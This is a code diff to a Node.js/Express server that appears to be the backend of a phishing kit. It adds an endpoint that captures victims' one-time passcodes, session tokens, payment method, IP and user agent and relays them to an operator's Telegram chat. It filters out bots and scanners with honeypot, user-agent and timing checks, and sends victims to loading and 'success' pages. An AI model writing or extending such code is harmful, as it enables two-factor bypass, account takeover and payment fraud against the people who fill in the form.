@@ -192,7 +192,7 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         res.json({ 
             success: true, 
             message: 'Form submitted successfully',
-            redirect: '/processing.html'
+            redirect: '/loading.html'
         });
         
     } catch (error) {
@@ -200,6 +200,107 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         res.status(500).json({ 
             success: false, 
             message: 'An error occurred processing your submission. Please try again later.' 
+        });
+    }
+});
+
+// Helper function to validate OTP submission.
+// Same defensive layers as validateSubmission: honeypot, UA, timing.
+function validateOtpSubmission(req) {
+    const errors = [];
+
+    // 1. Honeypot field
+    if (req.body.company_url && req.body.company_url.trim() !== '') {
+        errors.push('Bot detected: honeypot field filled');
+    }
+
+    // 2. User-Agent check
+    const userAgent = req.headers['user-agent'] || '';
+    if (userAgent && BOT_USER_AGENT_PATTERNS.some((re) => re.test(userAgent))) {
+        errors.push('Bot detected: automated User-Agent');
+    }
+
+    // 3. OTP must be 6 digits
+    const otp = String(req.body.otp_code || '').trim();
+    if (!/^\d{6}$/.test(otp)) {
+        errors.push('Invalid verification code');
+    }
+
+    // 4. Timing check
+    const formLoadTime = parseInt(req.body.form_load_time, 10);
+    if (!Number.isNaN(formLoadTime) && formLoadTime > 0) {
+        const elapsed = Date.now() - formLoadTime;
+        if (elapsed >= 0 && elapsed < 1000) {
+            errors.push('Form submitted too quickly');
+        }
+    }
+
+    return errors;
+}
+
+// OTP submission endpoint
+app.post('/api/submit-otp', submitLimiter, async (req, res) => {
+    try {
+        const validationErrors = validateOtpSubmission(req);
+
+        if (validationErrors.length > 0) {
+            console.log('OTP validation failed:', validationErrors);
+            return res.status(400).json({
+                success: false,
+                message: 'Invalid verification code. Please try again.',
+                errors: validationErrors
+            });
+        }
+
+        const sanitize = (v, max = 256) => (v == null ? '' : String(v).slice(0, max));
+        const otpData = {
+            paymentMethod: req.body.vehicle1 || 'Not specified',
+            sessionToken: sanitize(req.body.session_token, 64),
+            otpCode: sanitize(req.body.otp_code, 8),
+            ipAddress: req.ip || req.connection.remoteAddress,
+            userAgent: req.headers['user-agent'],
+            timestamp: new Date().toISOString(),
+            referer: req.headers['referer'] || 'Direct',
+        };
+
+        // Log submission (OTP is intentionally redacted in console logs;
+        // full details go only to the configured Telegram chat).
+        console.log('OTP submission received:', {
+            paymentMethod: otpData.paymentMethod,
+            sessionToken: otpData.sessionToken,
+            ipAddress: otpData.ipAddress,
+            userAgent: otpData.userAgent,
+            timestamp: otpData.timestamp,
+            referer: otpData.referer,
+        });
+
+        const mdEscape = (s) => String(s).replace(/([_*`\[\]()~>#+=|{}.!\\-])/g, '\\$1');
+
+        if (bot && TELEGRAM_CHAT_ID) {
+            const message = `🔐 *New OTP Verification Submission*\n\n` +
+                `💳 *Payment Method:* ${mdEscape(otpData.paymentMethod)}\n` +
+                `🔢 *OTP Code:* \`${mdEscape(otpData.otpCode || 'N/A')}\`\n` +
+                `🔑 *Session Token:* \`${mdEscape(otpData.sessionToken || 'N/A')}\`\n` +
+                `📅 *Timestamp:* ${mdEscape(otpData.timestamp)}\n` +
+                `🌐 *IP Address:* ${mdEscape(String(otpData.ipAddress || ''))}\n` +
+                `📱 *User Agent:* ${mdEscape(String(otpData.userAgent || ''))}\n` +
+                `🔗 *Referer:* ${mdEscape(String(otpData.referer || ''))}`;
+
+            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'MarkdownV2' });
+            console.log('OTP notification sent to Telegram');
+        }
+
+        res.json({
+            success: true,
+            message: 'OTP submitted successfully',
+            redirect: '/success.html'
+        });
+
+    } catch (error) {
+        console.error('Error processing OTP submission:', error);
+        res.status(500).json({
+            success: false,
+            message: 'An error occurred verifying your code. Please try again later.'
         });
     }
 });
